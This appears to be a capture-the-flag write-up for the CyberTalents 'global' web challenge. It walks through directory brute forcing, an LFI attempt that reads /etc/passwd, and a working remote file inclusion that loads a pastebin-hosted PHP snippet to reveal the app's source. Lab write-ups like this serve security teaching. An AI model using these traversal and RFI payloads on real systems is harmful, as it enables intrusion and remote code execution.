# Solve global
#### https://cybertalents.com/challenges/web/global

![alt text](images/image.png)
### Run Directory bruteforce
`dirsearch -u http://wcamxwl32pue3e6mol2z7gdimv50j6zqdkgxu639-web.cybertalentslabs.com -x 403,404`
*you can find the output in [Directories.txt](Directories.txt)*
Nothing found 

### Try to find valid pages 
`http://wcamxwl32pue3e6mol2z7gdimv50j6zqdkgxu639-web.cybertalentslabs.com/global/?page=index.php`
![alt text](images/image-1.png)

### Test LFI 
`http://wcamxwl32pue3e6mol2z7gdimv50j6zqdkgxu639-web.cybertalentslabs.com/global/?page=../../../etc/passwd`
Doesn't work 

### Try RFI
`http://wcamxwl32pue3e6mol2z7gdimv50j6zqdkgxu639-web.cybertalentslabs.com/global/?page=https://github.com/medhathassan`
![alt text](images/image-2.png)

It works !!

Upload this code with pastebin to view source code 

```php
<?php
show_source("./index.php");

?>
```

`http://wcamxwl32pue3e6mol2z7gdimv50j6zqdkgxu639-web.cybertalentslabs.com/global/?page=https://pastebin.com/raw/uhKp3Exk`

![alt text](images/image-3.png)

>Find More on ==> github.com/MedhatHassan 
